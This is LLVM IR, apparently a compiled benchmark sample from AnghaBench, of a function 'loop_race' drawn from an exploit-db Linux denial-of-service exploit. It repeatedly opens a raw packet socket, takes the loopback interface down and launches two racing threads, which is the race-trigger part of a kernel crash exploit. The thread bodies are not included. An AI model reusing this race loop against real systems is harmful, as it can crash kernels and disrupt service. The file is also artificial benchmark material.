; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_43010.c_loop_race.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_43010.c_loop_race.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i16, i32 }
%struct.TYPE_5__ = type { i32, i32, i32 }

@AF_PACKET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@PF_PACKET = common dso_local global i32 0, align 4
@fd = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@ifr = common dso_local global %struct.TYPE_4__ zeroinitializer, align 4
@.str.1 = private unnamed_addr constant [3 x i8] c"lo\00", align 1
@SIOCGIFINDEX = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [19 x i8] c"ioctl SIOCGIFINDEX\00", align 1
@SIOCGIFFLAGS = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [19 x i8] c"ioctl SIOCGIFFLAGS\00", align 1
@IFF_UP = common dso_local global i64 0, align 8
@SIOCSIFFLAGS = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [19 x i8] c"ioctl SIOCSIFFLAGS\00", align 1
@addr = common dso_local global %struct.TYPE_5__ zeroinitializer, align 4
@task1 = common dso_local global i32 0, align 4
@task2 = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @loop_race() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  br label %5

5:                                                ; preds = %0, %5
  %6 = load i32, i32* @AF_PACKET, align 4
  %7 = load i32, i32* @SOCK_RAW, align 4
  %8 = load i32, i32* @PF_PACKET, align 4
  %9 = call i32 @socket(i32 %6, i32 %7, i32 %8)
  store i32 %9, i32* @fd, align 4
  %10 = load i32, i32* @fd, align 4
  %11 = icmp eq i32 %10, -1
  %12 = zext i1 %11 to i32
  %13 = call i32 @IS_ERR(i32 %12, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 @strcpy(i8* bitcast (i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @ifr, i32 0, i32 2) to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* @fd, align 4
  %16 = load i32, i32* @SIOCGIFINDEX, align 4
  %17 = call i32 @ioctl(i32 %15, i32 %16, %struct.TYPE_4__* @ifr)
  store i32 %17, i32* %1, align 4
  %18 = load i32, i32* %1, align 4
  %19 = icmp eq i32 %18, -1
  %20 = zext i1 %19 to i32
  %21 = call i32 @IS_ERR(i32 %20, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  %22 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @ifr, i32 0, i32 0), align 4
  store i32 %22, i32* %2, align 4
  %23 = load i32, i32* @fd, align 4
  %24 = load i32, i32* @SIOCGIFFLAGS, align 4
  %25 = call i32 @ioctl(i32 %23, i32 %24, %struct.TYPE_4__* @ifr)
  store i32 %25, i32* %1, align 4
  %26 = load i32, i32* %1, align 4
  %27 = icmp eq i32 %26, -1
  %28 = zext i1 %27 to i32
  %29 = call i32 @IS_ERR(i32 %28, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0))
  %30 = load i64, i64* @IFF_UP, align 8
  %31 = trunc i64 %30 to i16
  %32 = sext i16 %31 to i32
  %33 = xor i32 %32, -1
  %34 = load i16, i16* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @ifr, i32 0, i32 1), align 4
  %35 = sext i16 %34 to i32
  %36 = and i32 %35, %33
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @ifr, i32 0, i32 1), align 4
  %38 = load i32, i32* @fd, align 4
  %39 = load i32, i32* @SIOCSIFFLAGS, align 4
  %40 = call i32 @ioctl(i32 %38, i32 %39, %struct.TYPE_4__* @ifr)
  store i32 %40, i32* %1, align 4
  %41 = load i32, i32* %1, align 4
  %42 = icmp eq i32 %41, -1
  %43 = zext i1 %42 to i32
  %44 = call i32 @IS_ERR(i32 %43, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0))
  %45 = load i32, i32* @AF_PACKET, align 4
  store i32 %45, i32* getelementptr inbounds (%struct.TYPE_5__, %struct.TYPE_5__* @addr, i32 0, i32 2), align 4
  store i32 0, i32* getelementptr inbounds (%struct.TYPE_5__, %struct.TYPE_5__* @addr, i32 0, i32 0), align 4
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* getelementptr inbounds (%struct.TYPE_5__, %struct.TYPE_5__* @addr, i32 0, i32 1), align 4
  %47 = load i32, i32* @task1, align 4
  %48 = call i32 @pthread_create(i32* %3, i32* null, i32 %47, i32* null)
  %49 = load i32, i32* @task2, align 4
  %50 = call i32 @pthread_create(i32* %4, i32* null, i32 %49, i32* null)
  %51 = load i32, i32* %3, align 4
  %52 = call i32 @pthread_join(i32 %51, i32* null)
  %53 = load i32, i32* %4, align 4
  %54 = call i32 @pthread_join(i32 %53, i32* null)
  %55 = load i32, i32* @fd, align 4
  %56 = call i32 @close(i32 %55)
  br label %5
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @IS_ERR(i32, i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @ioctl(i32, i32, %struct.TYPE_4__*) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, i32*) #1

declare dso_local i32 @pthread_join(i32, i32*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
